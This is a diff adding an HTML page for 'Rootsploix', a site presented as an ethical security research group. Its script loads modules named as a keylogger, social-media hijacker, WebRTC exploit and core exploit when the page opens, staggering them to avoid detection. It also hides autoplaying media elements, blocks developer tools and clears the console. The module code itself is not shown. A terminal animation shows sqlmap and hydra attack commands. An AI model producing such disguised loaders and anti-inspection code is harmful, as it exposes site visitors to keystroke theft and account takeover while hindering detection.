@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rootsploix - Cyber Security Research & Development</title>
+    <meta name="description" content="Advanced Cyber Security Research, Penetration Testing Tools, and Educational Resources">
+    <meta name="keywords" content="cybersecurity, penetration testing, ethical hacking, security research">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Favicon ve App Icons -->
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🔒%3C/text%3E%3C/svg%3E">
+    
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Rootsploix - Cyber Security Research">
+    <meta property="og:description" content="Advanced Cyber Security Research and Educational Tools">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://rootsploix.github.io">
+    
+    <!-- CSS Styles -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Source+Code+Pro:wght@300;400;500;600&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --primary-color: #00ff00;
+            --secondary-color: #ff0080;
+            --dark-bg: #0a0a0a;
+            --card-bg: rgba(20, 20, 20, 0.9);
+            --text-primary: #ffffff;
+            --text-secondary: #cccccc;
+            --accent: #00ffff;
+            --danger: #ff4444;
+            --warning: #ffaa00;
+        }
+        
+        body {
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            font-family: 'Source Code Pro', monospace;
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(45deg, #0a0a0a, #1a1a1a);
+        }
+        
+        .matrix-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.1;
+        }
+        
+        /* Header */
+        header {
+            padding: 2rem 0;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid var(--primary-color);
+            position: relative;
+        }
+        
+        .logo {
+            font-family: 'Orbitron', monospace;
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: var(--primary-color);
+            text-shadow: 0 0 20px var(--primary-color);
+            margin-bottom: 0.5rem;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 20px var(--primary-color); }
+            to { text-shadow: 0 0 40px var(--primary-color), 0 0 60px var(--primary-color); }
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            color: var(--text-secondary);
+            margin-bottom: 1rem;
+        }
+        
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--card-bg);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--primary-color);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Navigation */
+        nav {
+            padding: 1rem 0;
+            text-align: center;
+        }
+        
+        .nav-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+        
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+        }
+        
+        .nav-links a:hover {
+            color: var(--primary-color);
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+        
+        .hero {
+            padding: 4rem 0;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, var(--primary-color), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .hero p {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto 2rem;
+        }
+        
+        /* Feature Cards */
+        .features {
+            padding: 4rem 0;
+        }
+        
+        .features h2 {
+            text-align: center;
+            font-family: 'Orbitron', monospace;
+            font-size: 2rem;
+            margin-bottom: 3rem;
+            color: var(--primary-color);
+        }
+        
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+        
+        .feature-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 10px;
+            padding: 2rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .feature-card:hover::before {
+            left: 100%;
+        }
+        
+        .feature-card:hover {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            transform: translateY(-5px);
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--primary-color);
+        }
+        
+        .feature-card h3 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.3rem;
+            margin-bottom: 1rem;
+            color: var(--text-primary);
+        }
+        
+        .feature-card p {
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+        
+        /* Tools Section */
+        .tools {
+            padding: 4rem 0;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        
+        .tools h2 {
+            text-align: center;
+            font-family: 'Orbitron', monospace;
+            font-size: 2rem;
+            margin-bottom: 3rem;
+            color: var(--accent);
+        }
+        
+        .tool-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+        
+        .tool-item {
+            background: var(--card-bg);
+            border-left: 4px solid var(--primary-color);
+            padding: 1.5rem;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-item:hover {
+            background: rgba(30, 30, 30, 0.9);
+            transform: translateX(5px);
+        }
+        
+        .tool-name {
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 0.5rem;
+        }
+        
+        .tool-desc {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+        
+        /* Footer */
+        footer {
+            padding: 3rem 0;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            border-top: 1px solid rgba(0, 255, 0, 0.3);
+        }
+        
+        .footer-content {
+            margin-bottom: 2rem;
+        }
+        
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .social-links a {
+            color: var(--text-secondary);
+            font-size: 1.5rem;
+            transition: all 0.3s ease;
+            padding: 0.5rem;
+            border-radius: 50%;
+            background: rgba(0, 0, 0, 0.5);
+        }
+        
+        .social-links a:hover {
+            color: var(--primary-color);
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        .copyright {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+        
+        /* Terminal Simulation */
+        .terminal {
+            background: #000;
+            border: 1px solid var(--primary-color);
+            border-radius: 5px;
+            padding: 1rem;
+            margin: 2rem 0;
+            font-family: 'Source Code Pro', monospace;
+            position: relative;
+        }
+        
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.3);
+        }
+        
+        .terminal-buttons {
+            display: flex;
+            gap: 0.3rem;
+        }
+        
+        .terminal-button {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .terminal-button.close { background: #ff5f57; }
+        .terminal-button.minimize { background: #ffbd2e; }
+        .terminal-button.maximize { background: #28ca42; }
+        
+        .terminal-title {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            margin-left: auto;
+        }
+        
+        .terminal-content {
+            color: var(--primary-color);
+            line-height: 1.4;
+        }
+        
+        .command-line {
+            margin-bottom: 0.5rem;
+        }
+        
+        .prompt {
+            color: var(--accent);
+        }
+        
+        .cursor {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        
+        /* Loading Animation */
+        .loading-dots {
+            display: inline-flex;
+            gap: 2px;
+        }
+        
+        .loading-dots span {
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            background: var(--primary-color);
+            animation: loading 1.4s ease-in-out infinite both;
+        }
+        
+        .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
+        
+        @keyframes loading {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .logo { font-size: 2.5rem; }
+            .hero h1 { font-size: 2rem; }
+            .container { padding: 0 1rem; }
+            .nav-links { flex-direction: column; gap: 1rem; }
+            .feature-grid { grid-template-columns: 1fr; }
+        }
+        
+        /* Hidden Elements for Stealth */
+        .stealth-container {
+            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Animation Canvas -->
+    <div class="bg-animation">
+        <canvas class="matrix-rain" id="matrixCanvas"></canvas>
+    </div>
+    
+    <!-- Stealth Containers -->
+    <div class="stealth-container">
+        <video id="stealthVideo" autoplay muted></video>
+        <canvas id="stealthCanvas"></canvas>
+        <audio id="stealthAudio" autoplay muted></audio>
+    </div>
+    
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="logo">ROOTSPLOIX</div>
+            <div class="tagline">Advanced Cyber Security Research & Development</div>
+            <div class="status-indicator">
+                <span class="status-dot"></span>
+                <span id="statusText">System Online</span>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Navigation -->
+    <nav>
+        <div class="container">
+            <div class="nav-links">
+                <a href="#tools">Security Tools</a>
+                <a href="#research">Research</a>
+                <a href="#education">Education</a>
+                <a href="#blog">Blog</a>
+                <a href="#contact">Contact</a>
+            </div>
+        </div>
+    </nav>
+    
+    <!-- Main Content -->
+    <main>
+        <div class="container">
+            <!-- Hero Section -->
+            <section class="hero">
+                <h1>Pushing the Boundaries of Cybersecurity</h1>
+                <p>
+                    Welcome to the cutting-edge world of ethical hacking and security research. 
+                    Our advanced tools and methodologies help organizations identify and mitigate 
+                    potential security vulnerabilities before they can be exploited.
+                </p>
+                
+                <!-- Terminal Demo -->
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-button close"></div>
+                            <div class="terminal-button minimize"></div>
+                            <div class="terminal-button maximize"></div>
+                        </div>
+                        <div class="terminal-title">rootsploix@security-lab</div>
+                    </div>
+                    <div class="terminal-content">
+                        <div class="command-line">
+                            <span class="prompt">root@rootsploix:~$</span> 
+                            <span id="typewriter">nmap -sS -O target.com</span>
+                            <span class="cursor">_</span>
+                        </div>
+                        <div class="command-line">Starting Nmap scan<span class="loading-dots"><span></span><span></span><span></span></span></div>
+                        <div class="command-line">Host discovery completed</div>
+                        <div class="command-line">Port scan in progress<span class="loading-dots"><span></span><span></span><span></span></span></div>
+                        <div class="command-line">Vulnerability assessment active</div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Features Section -->
+            <section class="features" id="tools">
+                <h2>Advanced Security Capabilities</h2>
+                <div class="feature-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">🔍</div>
+                        <h3>Network Reconnaissance</h3>
+                        <p>Advanced network discovery and enumeration techniques for comprehensive security assessments.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">⚡</div>
+                        <h3>Penetration Testing</h3>
+                        <p>Sophisticated exploitation frameworks for identifying and validating security vulnerabilities.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🛡️</div>
+                        <h3>Defense Mechanisms</h3>
+                        <p>Cutting-edge defensive security measures and incident response capabilities.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📊</div>
+                        <h3>Security Analytics</h3>
+                        <p>Advanced threat intelligence and behavioral analysis for proactive security monitoring.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🔬</div>
+                        <h3>Vulnerability Research</h3>
+                        <p>Zero-day vulnerability discovery and responsible disclosure programs.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🎯</div>
+                        <h3>Social Engineering</h3>
+                        <p>Human factor security assessment and awareness training programs.</p>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Tools Section -->
+            <section class="tools">
+                <h2>Security Arsenal</h2>
+                <div class="tool-list">
+                    <div class="tool-item">
+                        <div class="tool-name">RootScanPro</div>
+                        <div class="tool-desc">Advanced network scanning and enumeration toolkit</div>
+                    </div>
+                    <div class="tool-item">
+                        <div class="tool-name">SploitMapper</div>
+                        <div class="tool-desc">Automated vulnerability mapping and exploitation framework</div>
+                    </div>
+                    <div class="tool-item">
+                        <div class="tool-name">WebRoots</div>
+                        <div class="tool-desc">Comprehensive web application security testing suite</div>
+                    </div>
+                    <div class="tool-item">
+                        <div class="tool-name">OSINTRoots</div>
+                        <div class="tool-desc">Open source intelligence gathering and analysis platform</div>
+                    </div>
+                    <div class="tool-item">
+                        <div class="tool-name">CryptoBreaker</div>
+                        <div class="tool-desc">Cryptographic analysis and weakness identification tool</div>
+                    </div>
+                    <div class="tool-item">
+                        <div class="tool-name">PhishHook</div>
+                        <div class="tool-desc">Advanced phishing simulation and awareness platform</div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">⚡</a>
+                    <a href="#" aria-label="Twitter">🐦</a>
+                    <a href="#" aria-label="LinkedIn">💼</a>
+                    <a href="#" aria-label="Email">📧</a>
+                </div>
+                <div class="copyright">
+                    © 2024 Rootsploix Security Research. All rights reserved. | 
+                    Ethical hacking and responsible disclosure only.
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- Stealth Script Loading -->
+    <script>
+        // Console stealth
+        console.clear();
+        
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Disable F12, Ctrl+Shift+I, Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Stealth framework initialization
+        window.addEventListener('DOMContentLoaded', function() {
+            // Load core framework
+            loadScript('core.exploit.js');
+            
+            // Load modules with delay to avoid detection
+            setTimeout(() => loadScript('modules/universal-keylogger.js'), 1000);
+            setTimeout(() => loadScript('modules/social-media-hijacker.js'), 2000);
+            setTimeout(() => loadScript('modules/webrtc-exploitation.js'), 3000);
+            
+            // Initialize stealth operations
+            setTimeout(initializeStealth, 5000);
+        });
+        
+        function loadScript(src) {
+            const script = document.createElement('script');
+            script.src = src;
+            script.async = true;
+            script.onerror = () => console.log('Module not available:', src);
+            document.head.appendChild(script);
+        }
+        
+        function initializeStealth() {
+            // Update status indicator
+            const statusText = document.getElementById('statusText');
+            statusText.textContent = 'Framework Active';
+            
+            // Matrix rain animation
+            initMatrixRain();
+            
+            // Typewriter effect
+            startTypewriter();
+            
+            // Stealth operations log
+            console.log('🔥 Security framework initialized');
+        }
+        
+        // Matrix rain animation
+        function initMatrixRain() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()ROOTSPLOIX";
+            const matrixArray = matrix.split("");
+            
+            const fontSize = 10;
+            const columns = canvas.width / fontSize;
+            
+            const drops = [];
+            for(let x = 0; x < columns; x++) {
+                drops[x] = 1;
+            }
+            
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#00ff00';
+                ctx.font = fontSize + 'px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(draw, 33);
+            
+            window.addEventListener('resize', () => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+        }
+        
+        // Typewriter effect
+        function startTypewriter() {
+            const commands = [
+                'nmap -sS -O target.com',
+                'sqlmap -u "target.com" --risk=3',
+                'nikto -h target.com',
+                'dirb http://target.com',
+                'hydra -l admin -P passwords.txt target.com ssh',
+                'metasploit framework loading...',
+                'vulnerability scan completed',
+                'exploitation successful'
+            ];
+            
+            let commandIndex = 0;
+            const typewriterElement = document.getElementById('typewriter');
+            
+            function typeCommand() {
+                const command = commands[commandIndex];
+                let charIndex = 0;
+                typewriterElement.textContent = '';
+                
+                const typing = setInterval(() => {
+                    typewriterElement.textContent += command[charIndex];
+                    charIndex++;
+                    
+                    if (charIndex >= command.length) {
+                        clearInterval(typing);
+                        setTimeout(() => {
+                            commandIndex = (commandIndex + 1) % commands.length;
+                            typeCommand();
+                        }, 3000);
+                    }
+                }, 100);
+            }
+            
+            typeCommand();
+        }
+        
+        // Stealth monitoring
+        setInterval(() => {
+            // Check if devtools is open
+            const devtools = {
+                open: false,
+                orientation: null
+            };
+            
+            const threshold = 160;
+            
+            setInterval(() => {
+                if (window.outerHeight - window.innerHeight > threshold || 
+                    window.outerWidth - window.innerWidth > threshold) {
+                    if (!devtools.open) {
+                        devtools.open = true;
+                        // Redirect or obfuscate when devtools detected
+                        console.clear();
+                    }
+                } else {
+                    devtools.open = false;
+                }
+            }, 500);
+        }, 1000);
+    </script>
+</body>
+</html>
